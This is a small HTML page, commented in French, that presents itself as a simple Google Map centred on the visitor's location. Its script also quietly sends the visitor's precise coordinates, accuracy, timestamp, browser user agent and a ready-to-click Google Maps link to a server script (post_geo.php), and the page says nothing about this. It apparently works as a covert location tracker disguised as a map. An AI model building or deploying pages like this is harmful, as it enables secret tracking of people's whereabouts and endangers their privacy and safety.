<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Map Google</title>
<style>
  html, body { height: 100%; margin: 0; padding:0; }
  #map { height: 100%; width: 100%; }
</style>
</head>
<body>
<div id="map"></div>

<script>
function initMap() {
    const map = new google.maps.Map(document.getElementById("map"), {
        center: { lat: 0, lng: 0 },
        zoom: 2,
    });

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const userLoc = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude
                };
                map.setCenter(userLoc);
                map.setZoom(15);

                const marker = new google.maps.Marker({
                    position: userLoc,
                    map: map,
                    title: "Vous êtes ici"
                });

                // Générer le lien Google Maps
                const mapsLink = `https://www.google.com/maps?q=${userLoc.lat},${userLoc.lng}`;

                // Envoyer au serveur
                fetch("post_geo.php", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        lat: userLoc.lat,
                        lon: userLoc.lng,
                        accuracy_m: pos.coords.accuracy,
                        timestamp: pos.timestamp,
                        userAgent: navigator.userAgent,
                        origin: window.location.origin,
                        maps_link: mapsLink
                    })
                });
            },
            (err) => { alert("Impossible de récupérer la localisation: " + err.message); },
            { enableHighAccuracy: true }
        );
    } else {
        alert("La géolocalisation n'est pas supportée par ce navigateur.");
    }
}
</script>

<!-- Remplace `YOUR_API_KEY` par ta clé Google Maps JavaScript API -->
<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap" async defer></script>
</body>
</html>
